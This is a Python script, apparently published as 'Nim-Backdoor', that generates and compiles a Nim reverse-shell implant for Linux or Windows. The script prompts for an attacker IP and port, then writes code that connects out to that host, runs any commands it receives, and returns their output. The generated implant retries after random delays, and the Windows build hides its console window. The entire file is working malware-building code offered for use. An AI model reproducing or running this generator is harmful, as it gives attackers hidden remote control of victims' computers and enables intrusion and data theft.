import os
import subprocess
import ipaddress
import re

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def validate_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

def validate_os(os_type):
    return os_type.lower() in ['linux', 'windows']

def nim_compiler_exists():
    try:
        subprocess.run('nim --version', shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except subprocess.CalledProcessError:
        return False

print("\033[38;2;255;69;172m" + r'''
    _   ___                 ____             __       __                
   / | / (_)___ ___        / __ \____ ______/ /______/ /___  ____  _____
  /  |/ / / __ `__ \______/ __  / __ `/ ___/ //_/ __  / __ \/ __ \/ ___/
 / /|  / / / / / / /_____/ /_/ / /_/ / /__/ ,< / /_/ / /_/ / /_/ / /    
/_/ |_/_/_/ /_/ /_/     /_____/\__,_/\___/_/|_|\__,_/\____/\____/_/     
                                                                        
                                                  By @malwarekid
''' + "\033[0m")

ip = input("\033[32mEnter IP address:\033[0m ")
while not validate_ip(ip):
    print("\033[31mInvalid IP address.\033[0m")
    ip = input("\033[32mEnter IP address:\033[0m ")
    

port = input("\033[32mEnter your Port number:\033[0m ")
while not validate_port(port):
    print("\033[31mInvalid port number.\033[0m")
    port = input("\033[32mEnter your Port number:\033[0m ")

os_type = input("\033[36mChoose your OS\033[0m (\033[32mlinux\033[0m or \033[34mwindows\033[0m): ")
while not validate_os(os_type):
    print("\033[31mInvalid OS type.\033[0m")
    os_type = input("\033[36mChoose your OS\033[0m (\033[32mlinux\033[0m or \033[34mwindows\033[0m): ")
    

output_name = input("\033[36mEnter your output file name:\033[0m ")
while not re.match(r'^[\w\-. ]+$', output_name):
    print("\033[31mInvalid file name.\033[0m")
    output_name = input("\033[36mEnter your output file name:\033[0m ")

if not nim_compiler_exists():
    print("\033[31mNim compiler not found.\033[0m")
    exit(1)

if os_type.lower() == 'linux':
    exec_command = 'result = execProcess(c)'
elif os_type.lower() == 'windows':
    exec_command = 'result = execProcess("cmd /c " & c)'
else:
    print(f"\033[31mUnsupported OS:\033[0m {os_type}")
    exit(1)

nim_code = f'''
import net, os, osproc, strutils, random

proc exe(c: string): string =
  {exec_command}

let address = "{ip}"
let port = Port({port})

let exitMsg = "\\nExiting Program..."

var sock: Socket
var userRequestedExit = false

while not userRequestedExit:
  sock = newSocket()
  try:
    sock.connect(address, port)

    while true:
      sock.send(os.getCurrentDir() & "> ")
      let cmd = sock.recvLine().strip()
      if cmd == "exit":
        sock.send(exitMsg & "\\n")
        userRequestedExit = true
        break
      else:
        let result = exe(cmd)
        sock.send(result & "\\n")

  except OSError:
    if not userRequestedExit:
      let delay = rand(10000..60000)
      sleep(delay)
  finally:
    sock.close()
'''

try:
    with open('program.nim', 'w') as f:
        f.write(nim_code)
except Exception as e:
    print(f"\033[31mError writing to file: {e}\033[0m")
    exit(1)

if os_type.lower() == 'linux':
    compile_command = f'nim c -d=release --hints=off --verbosity=0 -o:{output_name} program.nim'
elif os_type.lower() == 'windows':
    compile_command = f'nim c -d=mingw -d=release --hints=off --verbosity=0 --app=gui -o:{output_name} program.nim'

try:
    subprocess.run(compile_command, shell=True, check=True)
    print(f"\n\033[36mOutput saved as\033[0m \033[31m{output_name}\033[0m")
    os.remove('program.nim')
except subprocess.CalledProcessError:
    print("\033[31mCompilation failed.\033[0m")
